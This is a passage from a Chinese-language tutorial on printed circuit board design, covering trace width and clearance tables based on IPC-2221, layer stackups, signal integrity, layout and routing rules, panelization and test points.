<code>0.2mm</code>，最小外径为<code>0.4mm</code>，双面板最小内径 <code>0.3mm</code>,最小外径 <code>0.5mm</code>；</li></ul><blockquote><p><strong>注意</strong>：具体参数请参考所打样 PCB 工厂的文档，例如：<a href="https://www.jlc.com/portal/vtechnology.html"><strong>《嘉立创 PCB 工艺参数》</strong></a>、<a href="https://www.jlc.com/portal/1/serviceGuide"><strong>《嘉立创制造工艺要求》</strong></a>、<a href="https://www.jiepei.com/capabilities.html"><strong>《捷配 PCB 工艺能力》</strong></a>。</p></blockquote><h3 id="布线宽度"><a href="#布线宽度" class="headerlink" title="布线宽度"></a>布线宽度</h3><p><strong>IPC</strong> 是美国印刷电路板协会（The Institute of Printed Circuit）的英文缩写，该组织制定了多个 PCB 设计与制造工艺相关的的规范与标准：</p><ul><li>《IPC-7525 钢网设计标准》</li><li><strong>《IPC-2221 PCB 设计通用标准》</strong></li><li>《IPC-SM-782 表面安装设计焊盘图形标准》</li><li>《IPC-SM-770 印制板组件装配规范(包括<strong>表面安装</strong>和<strong>穿孔安装</strong>的设计要求)》</li></ul><p>下面这个线宽计算公式出自于<strong>《IPC-2221 印制电路板通用设计标准》</strong>，适用于外层电流<code>35A</code>、内层电流<code>17.5A</code>、温度为<code>100C°</code>、宽度 <code>400mil</code> 的情况：：</p><p>当前 PCB 板厂可以加工的成品外层铜厚在<code>1oz ~ 2oz</code>（即 <code>35μm ~ 70μm</code>）之间，默认外层铜箔线路厚度为 <code>1oz</code>（最多可以做到 <code>2oz</code>），内层铜箔线路厚度为 <code>0.5oz</code>（即 <code>17μm</code>）。这里以默认的 <code>35μm</code> 布线厚度为基准，可以得到如下常用的<code>布线宽度</code>、<code>最大通过电流</code>、<code>阻抗</code>：</p><table><thead><tr><th>布线宽度</th><th>最大通过电流</th><th>阻抗</th></tr></thead><tbody><tr><td><strong>0.1mm</strong></td><td><code>0.450486 A</code></td><td><code>0.0982857 Ω</code></td></tr><tr><td><strong>0.2mm</strong></td><td><code>0.744609 A</code></td><td><code>0.0491429 Ω</code></td></tr><tr><td><strong>0.3mm</strong></td><td><code>0.999067 A</code></td><td><code>0.0327619 Ω</code></td></tr><tr><td><strong>0.4mm</strong></td><td><code>1.23077 A</code></td><td><code>0.0245714 Ω</code></td></tr><tr><td><strong>0.5mm</strong></td><td><code>1.44689 A</code></td><td><code>0.0196571 Ω</code></td></tr><tr><td><strong>0.6mm</strong></td><td><code>1.65136 A</code></td><td><code>0.016381 Ω</code></td></tr><tr><td><strong>0.7mm</strong></td><td><code>1.84662 A</code></td><td><code>0.0140408 Ω</code></td></tr><tr><td><strong>0.8mm</strong></td><td><code>2.03433 A</code></td><td><code>0.0122857 Ω</code></td></tr><tr><td><strong>0.9mm</strong></td><td><code>2.21568 A</code></td><td><code>0.0109206 Ω</code></td></tr><tr><td><strong>1.0mm</strong></td><td><code>2.39156 A</code></td><td><code>0.00982857 Ω</code></td></tr><tr><td><strong>1.2mm</strong></td><td><code>2.72953 A</code></td><td><code>0.00819048 Ω</code></td></tr><tr><td><strong>1.5mm</strong></td><td><code>3.20884 A</code></td><td><code>0.00655238 Ω</code></td></tr><tr><td><strong>2.0mm</strong></td><td><code>3.95301 A</code></td><td><code>0.00491429 Ω</code></td></tr><tr><td><strong>5.0mm</strong></td><td><code>7.6813 A</code></td><td><code>0.00196571 Ω</code></td></tr></tbody></table><h3 id="布线间距"><a href="#布线间距" class="headerlink" title="布线间距"></a>布线间距</h3><p><strong>安全间距</strong>是指 2 个导电子元件或者走线之间测得的最短空间距离，即在保证电气性能稳定与安全的前提下，通过空气所能够绝缘的最短距离。下面表格标注的是<strong>安全间距最小值</strong>，该数据来源于《IPC 2221 印刷电路板通用设计标准》。</p><table><thead><tr><th>电压</th><th>内层导体</th><th>外层导体(海拔 &lt; 3050 米)</th><th>外层导体(海拔 &gt; 3050 米)</th><th>外层导体(永久聚合物涂层)</th><th>外层导体(保形涂层)</th><th>外部元件引脚&#x2F;端接</th><th>外部元件引脚&#x2F;端接(保形涂层)</th></tr></thead><tbody><tr><td><strong>0 ~ 15 V</strong></td><td><code>0.05 mm</code></td><td><code>0.1 mm</code></td><td><code>0.1 mm</code></td><td><code>0.05 mm</code></td><td><code>0.13 mm</code></td><td><code>0.13 mm</code></td><td><code>0.13 mm</code></td></tr><tr><td><strong>16 ~ 30 V</strong></td><td><code>0.05 mm</code></td><td><code>0.1 mm</code></td><td><code>0.1 mm</code></td><td><code>0.05 mm</code></td><td><code>0.13 mm</code></td><td><code>0.25 mm</code></td><td><code>0.13 mm</code></td></tr><tr><td><strong>31 ~ 50V</strong></td><td><code>0.1 mm</code></td><td><code>0.6 mm</code></td><td><code>0.6 mm</code></td><td><code>0.13 mm</code></td><td><code>0.13 mm</code></td><td><code>0.4 mm</code></td><td><code>0.13 mm</code></td></tr><tr><td><strong>51 ~ 100</strong></td><td><code>0.1 mm</code></td><td><code>0.6 mm</code></td><td><code>1.5 mm</code></td><td><code>0.13 mm</code></td><td><code>0.13 mm</code></td><td><code>0.5 mm</code></td><td><code>0.13 mm</code></td></tr><tr><td><strong>101 ~ 150 V</strong></td><td><code>0.2 mm</code></td><td><code>0.6 mm</code></td><td><code>3.2 mm</code></td><td><code>0.4 mm</code></td><td><code>0.4 mm</code></td><td><code>0.8 mm</code></td><td><code>0.4 mm</code></td></tr><tr><td><strong>151 ~ 170 V</strong></td><td><code>0.2 mm</code></td><td><code>1.25 mm</code></td><td><code>3,2 mm</code></td><td><code>0.4 mm</code></td><td><code>0.4 mm</code></td><td><code>0.8 mm</code></td><td><code>0.4 mm</code></td></tr><tr><td><strong>171 ~ 250 V</strong></td><td><code>0.2 mm</code></td><td><code>1.25 mm</code></td><td><code>6.4 mm</code></td><td><code>0.4 mm</code></td><td><code>0.4 mm</code></td><td><code>0.8 mm</code></td><td><code>0.4 mm</code></td></tr><tr><td><strong>251 ~ 300 V</strong></td><td><code>0.2 mm</code></td><td><code>1.25 mm</code></td><td><code>12.5 mm</code></td><td><code>0.4 mm</code></td><td><code>0.4 mm</code></td><td><code>0.8 mm</code></td><td><code>0.8 mm</code></td></tr><tr><td><strong>301 ~ 500 V</strong></td><td><code>0.25 mm</code></td><td><code>2.5 mm</code></td><td><code>12.5 mm</code></td><td><code>0.8 mm</code></td><td><code>0.8 mm</code></td><td><code>1.5 mm</code></td><td><code>0.8 mm</code></td></tr></tbody></table><blockquote><p><strong>注意</strong>：目前大部分板厂所提供的布线最小间距为 <code>4mil</code>，即 <code>0.1mm</code>。</p></blockquote><h3 id="最小过孔"><a href="#最小过孔" class="headerlink" title="最小过孔"></a>最小过孔</h3><p>当前 PCB 板厂可以提供的多层板最小内径为 <code>0.2mm</code>，最小外径为 <code>0.4mm</code>，双面板最小内径 <code>0.3mm</code>，最小外径 <code>0.5mm</code>。</p><h2 id="封装尺寸"><a href="#封装尺寸" class="headerlink" title="封装尺寸"></a>封装尺寸</h2><h2 id="PCB-堆叠与分层"><a href="#PCB-堆叠与分层" class="headerlink" title="PCB 堆叠与分层"></a>PCB 堆叠与分层</h2><p>虽然 PCB 可以分为多层结构进行设计，但是通常元器件仅能在顶层或者底层，分别通过<strong>波峰焊</strong>（针对贴片元件）或者<strong>回流焊</strong>（针对分立元件）进行焊接：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111900542.png"></p><p>根据覆铜层数的不同，可以将 PCB 具体划分为如下 3 种类型：</p><ul><li><strong>单面 PCB 板</strong>：仅有一面走线或者覆铜；</li><li><strong>双面 PCB 板</strong>：顶层和底层都会进行走线或者覆铜；</li><li><strong>多层 PCB 板</strong>：除了顶层和底层之外，中间还包含了<code>信号层</code>、<code>中间层</code>、<code>电源层</code>、<code>接地层</code>，每一层之间相互绝缘并采用过孔连接；</li></ul><blockquote><p><strong>注意</strong>：因为双面 PCB 的电磁兼容性较差，所以通常仅用于低速设计当中。</p></blockquote><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111900925.png"></p><p>每层 PCB 之间，分别可以采用<code>通孔</code>、<code>盲孔</code>、<code>埋孔</code>方式进行连接。总体而言，绝大多数板级 EDA 工具软件都定义有下表当中的 PCB 功能层次：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><strong>顶层&#x2F;底层</strong></td><td>PCB 板顶面、底面的铜箔层，用于信号走线。</td></tr><tr><td><strong>内层</strong></td><td>覆盖有铜箔，用于信号走线与铺铜，可以设置为信号层和内电层。</td></tr><tr><td><strong>顶层&#x2F;底层丝印层</strong></td><td>印刷在 PCB 板上的字符层（通常为白色）。</td></tr><tr><td><strong>顶层&#x2F;底层锡膏层</strong></td><td>也称为正片工艺时的<strong>助焊层</strong>，用于为贴片焊盘制造不锈钢网使用的层，从而决定锡膏填充区域大小以辅助焊接，不需要贴片可以忽略该层；</td></tr><tr><td><strong>顶层&#x2F;底层阻焊层：</strong></td><td>PCB 顶层、底层上的盖油层（通常为绿色阻焊油），其作用是阻止焊锡粘结板材；该层为负片绘制方式，当有导线或区域不需要覆盖阻焊油时进行绘制，生产出的 PCB 相应区域将不会覆盖阻焊油，该操作通常称为<strong>开窗</strong>；</td></tr><tr><td><strong>边框层</strong></td><td>该层用于定义板框的形状、尺寸，板厂会基于该层进行 PCB 生产；</td></tr><tr><td><strong>顶层&#x2F;底层装配层</strong></td><td>元器件的简化轮廓，用于装配与维修，可以导出文档打印，不会对 PCB 板生产造成影响；</td></tr><tr><td><strong>机械层</strong></td><td>用于记录一些 PCB 板的机械信息，生产时默认不会使用该层定义的形状进行制造，某些板厂使用源文件生产时会采用机械层作为边框，使用 <code>Gerber</code> 文件生产时该层仅用于标识<code>工艺参数</code>、<code>V 割路径</code>等文字信息；</td></tr><tr><td><strong>文档层</strong></td><td>类似于机械层，但是该层仅在 EDA 工具当中可见，不会导出至 <code>Gerber</code> 文件当中；</td></tr><tr><td><strong>飞线层</strong></td><td>显示 PCB 网络飞线，不属于物理意义上的层，只是为了方便颜色设置，因此某些 EDA 工具会将其放置到<code>层管理器</code>当中进行配置；</td></tr><tr><td><strong>孔层</strong></td><td>类似于飞线层，不属于物理意义上的层，仅用于<strong>通孔</strong>（非金属化孔）的显示与颜色配置使用；</td></tr><tr><td><strong>多层</strong></td><td>类似于飞线层，金属化孔的显示和颜色配置，当焊盘层属性为多层时，该层将用于连接包括内层在内的每个铜箔层；</td></tr><tr><td><strong>错误层</strong></td><td>类似于飞线层，用于 DRC（设计规则检验）的错误标识显示与颜色配置；</td></tr></tbody></table><blockquote><p><strong>注意</strong>：<strong>信号层</strong>主要放置铜膜导线与元件，为电气信号提供传输通道；<strong>内部电源&#x2F;接地层</strong> 也称为<strong>内电层</strong>，主要用来铺设电源和接地，由大块的铜膜覆盖而成，可以提升 PCB 工作的稳定性。</p></blockquote><h3 id="四层-PCB-参考设计"><a href="#四层-PCB-参考设计" class="headerlink" title="四层 PCB 参考设计"></a>四层 PCB 参考设计</h3><table><thead><tr><th>板层顺序</th><th>第 1 层</th><th>第 2 层</th><th>第 3 层</th><th>第 4 层</th></tr></thead><tbody><tr><td><strong>第 1 种情况</strong></td><td>接地层</td><td>（信号 1 + 电源）</td><td>（信号 2 + 电源）</td><td>接地</td></tr><tr><td><strong>第 2 种情况</strong></td><td>信号 1</td><td>接地层</td><td>电源层</td><td>信号 2</td></tr><tr><td><strong>第 3 种情况</strong></td><td>接地层</td><td>信号 1</td><td>信号 2</td><td>电源层</td></tr></tbody></table><ul><li><strong>第 1 种情况</strong>，比较理想的四层板堆叠设计，因为最外层是接地层，对于 EMI 有屏蔽作用，同时<strong>电源层</strong>与<strong>接地层</strong>可以靠得很近，使得电源内阻较小；但是，当元器件密度比较大时，不能保证接地层的完整性，信号层的信号质量会变得较差，相邻信号层之间的串扰较大；</li><li><strong>第 2 种情况</strong>，这种方式较为常用，这种结构拥有较好的层电容效应，整个 PCB 的层间串扰较小，信号层可以取得较好的信号完整性；但这种结构当中，由于信号层处于表层，空间电磁辐射的强度增大，需要通过外加屏蔽壳才能够降低 EMI；</li><li><strong>第 3 种情况</strong>，电源层与接地层都处于表层，信号完整性比较好，其中 <code>信号 1</code> 层上的信号质量最好，<code>信号 2</code> 层次之；这种设计对于 EMI 有一定的屏蔽作用；但是，由于环路较大，器件密度的大小直接决定着信号质量，相邻信号层不能避免层间干扰，整体上不如第 1 种结构，除非对于电源功率有特殊要求；</li></ul><h3 id="六层-PCB-参考设计"><a href="#六层-PCB-参考设计" class="headerlink" title="六层 PCB 参考设计"></a>六层 PCB 参考设计</h3><table><thead><tr><th>板层顺序</th><th>第 1 层</th><th>第 2 层</th><th>第 3 层</th><th>第 4 层</th><th>第 5 层</th><th>第 6 层</th></tr></thead><tbody><tr><td><strong>第 1 种情况</strong></td><td>信号 1</td><td>接地层</td><td>信号 2</td><td>信号 3</td><td>电源层</td><td>信号 4</td></tr><tr><td><strong>第 2 种情况</strong></td><td>信号 1</td><td>信号 2</td><td>接地层</td><td>电源层</td><td>信号 3</td><td>信号 4</td></tr><tr><td><strong>第 3 种情况</strong></td><td>信号 1</td><td>接地层</td><td>信号 2</td><td>电源层</td><td>信号 3</td><td>信号 4</td></tr><tr><td><strong>第 4 种情况</strong></td><td>接地层</td><td>信号 1</td><td>电源层</td><td>接地层</td><td>信号 2</td><td>接地层</td></tr></tbody></table><ul><li><strong>第 1 种情况</strong>，是常见的方式之一，<code>信号 1</code> 层是比较好的布线层，<code>信号 2</code> 层次之；但是要注意 <code>信号 2</code> 与 <code>信号 3</code> 之间的层间串扰，<code>信号 4</code> 如果没有元件，就尽量减少信号线，并且多覆盖一层接地；</li><li><strong>第 2 种情况</strong>，<code>信号 2</code> 与 <code>信号 3</code>层的信号完整性最好，其中 <code>信号 2</code> 层为最好的布线层，<code>信号 3</code> 层次之；电源平面的阻抗较好，层间电容较大，有利于抑制整板的 EMI；但是由于 <code>信号 1</code> 与 <code>信号 2</code> 之间存在较大的层间干扰，并且距离电源层和接地层较远，EMI 空间辐射强度较大，可能需要外加屏蔽壳；</li><li><strong>第 3 种情况</strong>，这种情况是六层板的最佳布局，<code>信号 1</code>、<code>信号 2</code>、<code>信号 3</code> 都是比较好的布线层，并且电源平面的阻抗也比较好，美中不足之处在于 <code>信号 4</code> 距离接地层过远；</li><li><strong>第 4 种情况</strong>，虽然性能优于前面 3 种，但是可供布线的层数仅有 2 层；</li></ul><h2 id="信号完整性问题"><a href="#信号完整性问题" class="headerlink" title="信号完整性问题"></a>信号完整性问题</h2><p><strong>信号完整性（SI，Signal Integrity）</strong>是指 PCB 上的信号经由信号线传输以后仍然能保持完整与正确，当电路中的信号能够以正确的时序、符合要求的持续时间与电压幅度进行传送，并完整的到达输出端时，即说明该电路具有良好的信号完整性；而当信号不能正常响应时，就认为出现了信号完整性问题，特别是在高频高速电路当中。因此，信号完整性分析的目的就是为了确保信号的<strong>时序</strong>与<strong>电压</strong>幅度正确传输，电路设计当中常见的信号完整性问题主要集中在如下几个方面：</p><ul><li><strong>传输延迟</strong>（<code>Transmission Delay</code>）：指信号没有在规定的时间内以一定的持续时间和幅度到达接收端，通常是由于驱动过载、布线过长的传输线效应引起。此外，传输线上的电容、电感也会对信号的状态切换产生延时。高速电路设计当中，传输延迟是一个无法回避的问题，因此专门引入了一个<strong>延迟容限</strong>的概念，即确保电路正常工作的前提下，所允许的信号最大时序变化。</li><li><strong>反射</strong>（<code>Reflection</code>）：指传输线上的回波，信号功率的一部分从源端经过传输线传递至负载，另一部分则会向源端反射。高速电路设计当中，可以将导线等效为传输线，而非集总参数电路中的导线。若阻抗匹配(源端阻抗、传输线阻抗、负载阻抗三者相等)则反射不会发生；反之，如果负载阻抗与传输线阻抗不匹配就会导致接收端向源端的信号反射。布线的几何形状、不恰当的端接方式、经过连接器的传输及电源平面不连续等因素均会导致该问题，进而导致传送信号出现严重的<strong>过冲</strong>（Overshoot）或<strong>下冲</strong>（Undershoot）现象，并最终造成信号的波形变形与时序混乱。</li><li><strong>窜扰</strong>（<code>Crosstalk</code>）：指没有电气连接的信号线之间的感应电压与电流所导致的电磁耦合，这种耦合会造成信号线产生类似天线的作用。其中，容性耦合会引发耦合电流，感性耦合则会引发耦合电压，并伴随时钟速率的提升与 PCB 尺寸的缩小而加大，一切都是由于信号线上有交变的信号电流通过所产生的磁场，处于该磁场中的其它信号线就会感应到信号电压。PCB 的工作层的参数、信号线间距、驱动与接收端的电气特性、信号线本身的端接方式等等都会对窜扰造成一定影响。</li><li><strong>接地反弹</strong>（<code>Ground Bounce</code>）：指由于电路中由于较大电流涌动而在电源与接地平面之间产生的大量噪声，例如大量芯片同步进行切换时，就会在与电源平面之间产生较大的瞬时电流，而芯片封装与电源之间的寄生电感、电容、电阻就会随之引发电源噪声，造成电路在零电位上产生较大的电压波动，进而影响其它元器件的正常工作。</li></ul><blockquote><p><strong>注意</strong>：<strong>信号完整性问题</strong>往往与<strong>电磁兼容性问题</strong>相伴而生。</p></blockquote><h2 id="3W-20H-55-原则"><a href="#3W-20H-55-原则" class="headerlink" title="3W&#x2F;20H&#x2F;55 原则"></a>3W&#x2F;20H&#x2F;55 原则</h2><ul><li><strong>3W 原则</strong>：也称为 3H 原则，保证两条走线的中心间距大于 <strong>3 倍的线宽</strong>，从而减小走线之间的串扰；当走线间的中心距离大于 3 倍线宽时，可以保持 <code>70%</code> 的线间电场不会互相干扰；如要希望达到 <code>98%</code> 的线间电场不互相干扰，则可以使用 <strong>10W</strong> 规则；</li><li><strong>20H 原则</strong>：多层 PCB 的边缘会向外辐射电磁干扰，让<strong>电源平面</strong>尺寸相对<strong>地平面</strong>尺寸内缩相互间距的 <code>20</code> 倍尺寸，让电场只在接地层范围内进行传导，从而有效抑制这种边缘辐射效应；内缩 <code>20H</code> 则可以将 <code>70%</code> 的电场限制在接地层，内缩 <code>100H</code> 则可以限制 <code>98%</code> 的电场；</li><li><strong>55 原则</strong>：时钟频率达到 <code>5MHz</code> 或者脉冲信号的上升时间小于 <code>5ns</code>，那么 PCB 必须采用多层板；有时出于成本因素的考虑采用双层板结构，这种情况下最好将 PCB 其中一层作为完整的地平面层；</li></ul><h2 id="PCB-布局规范"><a href="#PCB-布局规范" class="headerlink" title="PCB 布局规范"></a>PCB 布局规范</h2><ol><li><strong>电源</strong>与<strong>信号</strong>要分开；</li><li>信号的<strong>输入</strong>与<strong>输出</strong>要分开；</li><li><strong>数字部分</strong>与<strong>模拟部分</strong>要分开；</li><li><strong>高频部分</strong>与<strong>低频部分</strong>要分开；</li><li><strong>强电部分</strong>与<strong>弱电部分</strong>要分开。</li></ol><h3 id="元件布局基本原则"><a href="#元件布局基本原则" class="headerlink" title="元件布局基本原则"></a>元件布局基本原则</h3><ul><li>通常条件下，所有元件均应分布在 PCB 的相同面上，只有在 PCB 顶层元件过密时，才将一些高度有限并且发热量较小的贴片元件放置在底层；</li><li>依据【<strong>先大后小，先难后易</strong>】的布线原则，重要的单元电路、核心元器件需要首先进行布局，并且保持关键信号线最短；</li><li><strong>高电压大电流信号</strong>与<strong>小电流低电压信号</strong>完全分开；<strong>模拟信号</strong>与<strong>数字信号</strong>分开；<strong>高频信号</strong>与<strong>低频信号</strong>分开，并且高频元器件的隔离要充分；</li><li>布局过程当中，充分参考原理框图，根据<strong>主信号流向</strong>摆放主要元器件；</li><li>元件的布局应当便于信号流通，并让信号尽可能保持一致的流动方向；</li><li>保证电气性能的前提下，元件应当放置在相互平行或者垂直排列的栅格上，以求整齐美观；</li><li>如果元件或导线之间存在较高的电位差，应当加大其间隔距离，避免由于放电击穿引起意外短路；</li><li>带有高电压的元件应当尽量布置在调试时，手不容易触及的地方；</li><li>位于 PCB 边缘的元件，距离边缘至少要有 <strong>2</strong> 个板厚的距离；</li><li>相同类型的<strong>插装元件</strong>应当同方向进行放置，同类型的有极性元件也尽量朝相同方向摆放，便于后期生产检测；</li><li>避免不同金属封装的元件相互接触；</li><li>元件之间的间隔距离需要满足操作空间的要求，例如插拔 TF 卡；</li><li>重量较大的元件，应当安装在靠近 PCB 支承点的位置，减小 PCB 板材受力的翘曲度；必要时还应当采取固定措施，不能仅依靠引脚焊面固定；</li><li>高压元器件和低压元器件之间保持较宽的<strong>电气隔离带</strong>，即不将电压等级相差较大的元器件摆放在一起，既有利于电气绝缘，也可以隔离信号提升抗干扰能力；</li></ul><h3 id="防止电磁干扰"><a href="#防止电磁干扰" class="headerlink" title="防止电磁干扰"></a>防止电磁干扰</h3><ul><li>电磁辐射较强的元件，或者对于电磁辐射较为敏感的元件，应<strong>加大相互之间的距离或者添加屏蔽罩</strong>，元件摆放的方向应当<strong>与相邻的铜泊导线交叉</strong>；</li><li>对于变压器、扬声器、电感等会产生磁场的元件，布局时应注意<strong>减少磁力线对于印制导线的切割</strong>，相邻元件磁场方向应相互垂直，减少彼此之间的耦合；</li><li><strong>电感器件</strong>不要近距离并排摆放，避免形成互感；</li><li>对电磁干扰源进行屏蔽，并且保证<strong>屏蔽罩能够良好的接地</strong>；</li><li>对于高频电路，需要<strong>考虑元件之间的分布参数</strong>的影响；</li></ul><h3 id="抑制热干扰"><a href="#抑制热干扰" class="headerlink" title="抑制热干扰"></a>抑制热干扰</h3><ul><li>发热元件优先安排在利于散热的位置，必要时可以单独设置散热片、散热风扇；</li><li>一些功耗大的集成块、大或中功率管、电阻等元件，要布置在容易散热的地方，并与其它元件隔开一定距离。</li><li>PCB 双面都摆放元件时，底层一般不放置发热元件；</li><li>电阻、电容、晶振等热敏元件，应当尽量远离高温区域，以避免受到热干扰；</li><li>热敏器件尽量摆放在上风口，<strong>高元件</strong>放置在<strong>矮元件</strong>后面，并且沿风阻最小的方向放置，避免风道受阻；</li><li>采用大面积的<strong>接地铜箔</strong>，提升 PCB 的散热效率；</li><li><strong>接地安装孔</strong>可以采用较大的焊盘，以充分利用安装螺栓和 PCB 两侧的铜箔进行散热；</li></ul><h3 id="电源布局"><a href="#电源布局" class="headerlink" title="电源布局"></a>电源布局</h3><ul><li>多采用<strong>星形拓扑结构</strong>，少采用<strong>菊花链布局</strong>，缩短电源的公共回路；</li><li>电源的<strong>输入与输出要分开进行布局</strong>，以避免串扰问题；</li><li>电源管理芯片、背光芯片、升压芯片需要放置在<strong>屏蔽壳</strong>当中；</li><li>电源走线要尽量<strong>避开射频区域</strong>；</li></ul><h3 id="高速元件与天线布局"><a href="#高速元件与天线布局" class="headerlink" title="高速元件与天线布局"></a>高速元件与天线布局</h3><ul><li>DDR、SDRAM、NAND Flash 等存储芯片需要靠近 CPU 进行摆放，并尽量减少线长以及交叉线的数量；</li><li>屏幕插座应当顺着 CPU 出线的方向，中间的 <strong>RC 滤波器</strong>尽量摆放在 CPU 一侧；</li><li>高速器件 CPU、液晶屏幕插座等应当远离天线模块；</li><li>射频模块和天线周边不要有金属元器件，以避免影响天线的频率点、阻抗等参数；</li></ul><h2 id="PCB-布线原则"><a href="#PCB-布线原则" class="headerlink" title="PCB 布线原则"></a>PCB 布线原则</h2><ul><li>高速信号的走线要尽可能<strong>短</strong>和<strong>直</strong>，走线间距要足够大，并且尽量靠近 PCB 边缘或者接插件；</li><li>相同信号传输线的<strong>线宽</strong>需要保持一致，<strong>拐线</strong>时同样需要保持相同的线宽；</li><li>重要的信号线可以<strong>增加线宽</strong>，以降低其特性阻抗；</li><li>关键信号线可以采用<strong>平行地线</strong>的方式进行隔离；</li><li>相邻的两层之间，走线采用 <strong>#</strong> 字型错开布线；</li><li>每条<strong>走线</strong>的宽度与元器件每个引脚的<strong>焊盘</strong>连接保持<strong>对称</strong>，并且从元件<strong>焊盘中心位置出线</strong>；</li><li>当和焊盘连接的走线比焊盘宽时，走线不能覆盖焊盘，应从焊盘末端引线；</li><li>引脚间距较为密集的贴片元件焊盘引脚，需要从<strong>焊盘外部</strong>走线进行连接，不允许直接连接引脚之间的焊盘；</li><li><strong>过孔</strong>可能会引发信号传输线的阻抗突变，因此需要尽量减少过孔使用的数量；</li><li>信号传输线上避免出现<strong>桩线</strong>，如果无法避免，那么桩线的长度应小于信号的上升时间，避免出现反射；</li><li>高速信号走线换层时，附近要有<strong>接地孔</strong>提供回流环路，确保整板回环小阻抗小；</li><li>模拟信号不要使用 EDA 工具的自动布线功能；</li><li>对敏感节点使用屏蔽线，即在受干扰结点的周边添加一组屏蔽线，并且在<strong>屏蔽线上放置多个接地过孔</strong>；</li></ul><h3 id="串扰"><a href="#串扰" class="headerlink" title="串扰"></a>串扰</h3><ul><li><strong>反向电流平行走线</strong>带来的串扰较大；</li><li>串扰强度与走线<strong>长度</strong>成正比，与<strong>间距</strong>成反比，与<strong>频率</strong>成正比；</li><li>加大走线的间距，缩小走线的平行长度，必要时可以采用 <strong>Jog-Out</strong> 凹凸布线；</li><li>加入端接匹配可以降低反射，并且减小串扰；</li><li>将信号层限制在高于接地平面 <code>10mil</code> 范围以内；</li><li>向串扰比较严重的两条线之间插入一条地线进行隔离，从而减小串扰；</li><li><strong>避开噪声源</strong>，例如 MCU、电感、晶振邻近的表层严禁走线或者打过孔；</li></ul><h3 id="覆铜"><a href="#覆铜" class="headerlink" title="覆铜"></a>覆铜</h3><ul><li>PCB 设计当中，没有布线的区域最好选择一个较大的<strong>接地平面</strong>来进行覆盖，以提供屏蔽和提高去耦能力；</li><li>发热元件周围或者大电流走线应当尽量避免使用大面积铜箔，长时间受热会导致铜箔膨胀脱落；</li><li>发热元件周围如果必须使用大面积铜箔，那么最好采用<strong>栅格覆铜</strong>，便于释放铜箔的表面张力；</li><li>相同层的走线分布不平衡或者不同层的铜分布不对称时，推荐覆铜设计。</li><li>PCB 最外层如果存在大面积的区域没有走线，建议在该区域内栅格覆铜，使得 PCB 整体的铜箔分布均匀；</li><li>推荐铺铜网格之间<strong>空白方格</strong>的大小约为 <code>25mil x 25mil</code>；</li><li>噪声敏感的电路需要考虑接地屏蔽，即在信号层的四周布宽度大于 <code>50mil</code> 地线或间距小于 <code>300mil</code> 的地孔；</li><li><strong>孤铜</strong>（特别是表层）超过 <code>150mils</code> 时，不能打接地过孔，需要删除该区域，以免形成悬空的天线；</li></ul><h2 id="PCB-拼板"><a href="#PCB-拼板" class="headerlink" title="PCB 拼板"></a>PCB 拼板</h2><p><strong>拼板</strong>是指由于电子元件自动化贴片，需要将单块 PCB 电路板进行 <strong>V 割</strong>或者<strong>邮票孔</strong>处理的加工方式。常见的 PCB 拼版方式主要有 3 种：<strong>同方向拼版</strong>、<strong>中心对称拼版</strong>、<strong>镜像对称拼版</strong>。</p><p><strong>同方向拼版</strong>：最简单的拼板方式，将同款的 PCB 设计平铺复制以后就可以实现。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111901557.png"></p><p><strong>中心对称拼版</strong>：适用于拼接<strong>两块</strong>形状不规则的 PCB，中间必须开铣（<code>xǐ</code>）槽才能够进行分离；如果拼版以后产生较大变形，可以考虑在拼版中添加邮票孔连接的<strong>辅助块</strong>。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111901826.png"></p><p><strong>镜像对称拼版</strong>：通常在 PCB 正反面的贴片元件都能够满足<strong>回流焊</strong>的焊接要求时采用，但是要注意镜像对称拼版需要满足 PCB 光绘的<strong>正负片对称分布</strong>，例如四层板第 2 层为电源&#x2F;接地的<strong>负片</strong>，则与其对称的第 3 层也必须是<strong>负片</strong>，否则不能采用镜像对称方式拼版。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111901339.png"></p><h2 id="工艺边"><a href="#工艺边" class="headerlink" title="工艺边"></a>工艺边</h2><p><strong>工艺边</strong>是为了满足自动化贴片的需要而增加的辅助部分，生产完成之后会被移除，一般设计为 <code>5mm</code>。</p><ul><li><strong>定位孔</strong>: 用于 PCB 加工和测试时的定位，一般设计为 <code>2mm</code> 的<strong>过孔</strong>；</li><li><strong>Mark 点</strong>: 用于自动化贴片机进行识别定位，通常设计为 <code>1mm</code> 的<strong>焊盘</strong>；</li></ul><h2 id="测试点"><a href="#测试点" class="headerlink" title="测试点"></a>测试点</h2><p>关键元件需要在 PCB 设计上添加测试点，以便于后期进行自动化的<strong>飞针测试</strong>。不允许将用于焊接贴片元件的焊盘作为检测点，必须单独设计专用的测试焊盘，以降低对于焊点检测和生产调试的影响。用作测试点的焊盘需要尽可能分布在 PCB 相同侧，以降低检测时间和成本。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111901397.png"></p><ul><li>测试点<strong>距离 PCB 边缘</strong>尽量大于 <code>5mm</code>；</li><li>确保测试点不会被<strong>阻焊</strong>层或者其它<strong>油墨</strong>覆盖；</li><li>测试点最好<strong>镀锡</strong>或者<strong>沉金</strong>处理，以防止氧化；</li><li>测试点尽量放置在<strong>距离元件</strong> <code>1mm</code> 以外，避免元件遭到探针的错误撞击；</li><li>测试点需要<strong>距离定位孔</strong> <code>3.2mm</code> 以上；</li><li>测试点的<strong>直径</strong>不可小于 <code>0.4mm</code>，相邻测试点的<strong>间距</strong>最好在 <code>2.54mm</code> 以上；</li><li>测试面不能放置<strong>高度</strong>超过 <code>6.4mm</code> 的元器件，以避免探针的测试夹具撞击到这些过高的元件；</li><li>确保每块<strong>芯片</strong>都拥有电源和接地测试点，并且尽可能靠近芯片（最好小于 <code>2.54mm</code>）；</li><li>在 PCB <strong>走线</strong>上设置测试点时，可以将测试焊盘的宽度进行适当放大；</li><li>测试点应当<strong>均匀分布</strong>在 PCB 上面，以避免探针下压产生的应力过于集中；</li><li><strong>电源</strong>应当分区域设置测试点，以便于去耦以及故障查询；</li></ul><h2 id="PCB-布线五要素"><a href="#PCB-布线五要素" class="headerlink" title="PCB 布线五要素"></a>PCB 